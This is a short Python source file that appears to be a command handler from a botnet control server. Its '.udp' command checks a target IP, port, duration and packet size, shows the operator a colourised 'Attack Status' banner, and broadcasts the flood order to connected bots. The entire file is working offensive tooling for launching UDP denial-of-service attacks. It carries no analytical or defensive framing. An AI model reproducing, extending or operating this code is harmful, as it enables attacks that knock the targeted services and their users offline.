from colorama import Fore
bots = {}
def udp(args, validate_ip, validate_port, validate_time, validate_size, send, client, ansi_clear, broadcast, data):
    if len(args) == 5:
        ip = args[1]
        port = args[2]
        secs = args[3]
        size = args[4]
        
        if validate_ip(ip):
            if validate_port(port, True):
                if validate_time(secs):
                    if validate_size(size):
                                send(client, f"{Fore.LIGHTWHITE_EX}Attack {Fore.CYAN}Status{Fore.LIGHTWHITE_EX}:")
                                send(client, f"{Fore.LIGHTWHITE_EX}I{Fore.CYAN}P{Fore.LIGHTWHITE_EX}: {Fore.CYAN}{ip}")
                                send(client, f"{Fore.LIGHTWHITE_EX}Po{Fore.CYAN}rt{Fore.LIGHTWHITE_EX}: {Fore.CYAN}{port}")
                                send(client, f"{Fore.LIGHTWHITE_EX}Si{Fore.CYAN}Ze{Fore.LIGHTWHITE_EX}: {Fore.CYAN}{size}")
                                send(client, f"{Fore.LIGHTWHITE_EX}Dura{Fore.CYAN}tion{Fore.LIGHTWHITE_EX}: {Fore.CYAN}{secs}")
                                send(client, f"{Fore.LIGHTWHITE_EX}Met{Fore.CYAN}hod{Fore.LIGHTWHITE_EX}: {Fore.CYAN}UDP")
                                broadcast(data)

                    else:
                        send(client, Fore.RED + 'Invalid packet size (1-65500 bytes)')
                else:
                    send(client, Fore.RED + 'Invalid attack duration (10-1300 seconds)')
            else:
                send(client, Fore.RED + 'Invalid port number (1-65535)')
        else:
            send(client, Fore.RED + 'Invalid IP address')
    else:
        send(client, 'Usage: .udp [IP] [PORT] [TIME] [SIZE]')
        send(client, 'Use port 0 for random port mode')
